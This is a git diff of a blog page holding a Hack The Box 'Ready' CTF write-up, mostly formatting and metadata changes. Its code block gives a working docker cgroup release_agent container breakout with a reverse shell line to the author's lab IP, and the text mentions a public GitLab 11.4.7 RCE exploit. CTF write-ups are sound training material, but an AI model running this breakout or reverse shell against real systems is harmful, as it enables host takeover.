@@ -34,12 +34,13 @@
   <link rel="stylesheet" href="/css/main.min.css">
 
 
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Ready HTB Writeup"/>
-<meta name="twitter:description" content="1. Enumeration:  Nmap:   Web Enumeration:   PORT 5080: Got gitlab login form   let&rsquo;s sign up: and we &rsquo;re in: checking /help :
- it&rsquo;s gitlab version 11.4.7   Searching for exploits:
-  got public one from exploitdb   let&rsquo;s download and edit the exploit:
-  As i remember it didn&rsquo;t work properly (there are some new versions of this exploit on exploitdb now) and i used another exploit from github back then"/>
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Ready HTB Writeup"/>
+<meta name="twitter:description" content="1. Enumeration: Nmap: Web Enumeration: PORT 5080: Got gitlab login form let&rsquo;s sign up: and we &rsquo;re in: checking /help :
+it&rsquo;s gitlab version 11.4.7 Searching for exploits:
+got public one from exploitdb let&rsquo;s download and edit the exploit:
+As i remember it didn&rsquo;t work properly (there are some new versions of this exploit on exploitdb now) and i used another exploit from github back then
+Github exploit: download and edit: python3 gitlab_rce."/>
+<meta name="twitter:site" content="@Wh1r1w1nd"/>
 
   <script type="application/ld+json">
 {
@@ -239,9 +240,9 @@ Got gitlab login form
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ready/20.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ready/29.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
 It roams the target machine looking for any interesting stuff to privilege with it .. i&rsquo;ll show the interesting ones only;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Possible private SSH keys were found!
-/var/opt/gitlab/gitlab-rails/etc/secrets.yml
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ready/21.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Possible private SSH keys were found!
+</span></span><span style="display:flex;"><span>/var/opt/gitlab/gitlab-rails/etc/secrets.yml
+</span></span></code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ready/21.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>This gitlab.rb looks interesting:</p>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ready/22.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
 <p>lets check the important paths manually:</p>
@@ -272,30 +273,30 @@ Tons of configurations</p>
 <li>docker privilege linux breakout &raquo; got <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout">this</a></li>
 </ul>
 <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ready/30.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># On the host</span>
-docker run --rm -it --cap-add<span style="color:#f92672">=</span>SYS_ADMIN --security-opt apparmor<span style="color:#f92672">=</span>unconfined ubuntu bash
-
-<span style="color:#75715e"># In the container</span>
-mkdir /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mkdir /tmp/cgrp/x
-
-echo <span style="color:#ae81ff">1</span> &gt; /tmp/cgrp/x/notify_on_release
-host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
-echo <span style="color:#e6db74">&#34;</span>$host_path<span style="color:#e6db74">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
-
-<span style="color:#75715e">#For a normal PoC =================</span>
-echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd
-echo <span style="color:#e6db74">&#34;ps aux &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd
-chmod a+x /cmd
-<span style="color:#75715e">#===================================</span>
-<span style="color:#75715e">#Reverse shell</span>
-echo <span style="color:#e6db74">&#39;#!/bin/bash&#39;</span> &gt; /cmd
-echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.21/9000 0&gt;&amp;1&#34;</span> &gt;&gt; /cmd
-chmod a+x /cmd
-<span style="color:#75715e">#===================================</span>
-
-sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
-head /output
-</code></pre></div><p>Let&rsquo;s make a file and put this script into it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On the host</span>
+</span></span><span style="display:flex;"><span>docker run --rm -it --cap-add<span style="color:#f92672">=</span>SYS_ADMIN --security-opt apparmor<span style="color:#f92672">=</span>unconfined ubuntu bash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># In the container</span>
+</span></span><span style="display:flex;"><span>mkdir /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mkdir /tmp/cgrp/x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#ae81ff">1</span> &gt; /tmp/cgrp/x/notify_on_release
+</span></span><span style="display:flex;"><span>host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;</span>$host_path<span style="color:#e6db74">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#For a normal PoC =================</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;ps aux &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd
+</span></span><span style="display:flex;"><span>chmod a+x /cmd
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#===================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Reverse shell</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;#!/bin/bash&#39;</span> &gt; /cmd
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.21/9000 0&gt;&amp;1&#34;</span> &gt;&gt; /cmd
+</span></span><span style="display:flex;"><span>chmod a+x /cmd
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#===================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
+</span></span><span style="display:flex;"><span>head /output
+</span></span></code></pre></div><p>Let&rsquo;s make a file and put this script into it:</p>
 <ul>
 <li>don&rsquo;t forget to put your own ip &gt; mine 10.10.16.15:
 <figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/ready/31.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
@@ -445,7 +446,7 @@ head /output
     <div class="copyright">
         &copy;
         
-        <span itemprop="copyrightYear">2020 - 2021</span>
+        <span itemprop="copyrightYear">2020 - 2024</span>
         
          
             <span class="author" itemprop="copyrightHolder"><a href="https://hussein-elsayed.github.io/">Wh1rlw1nd</a> | </span>
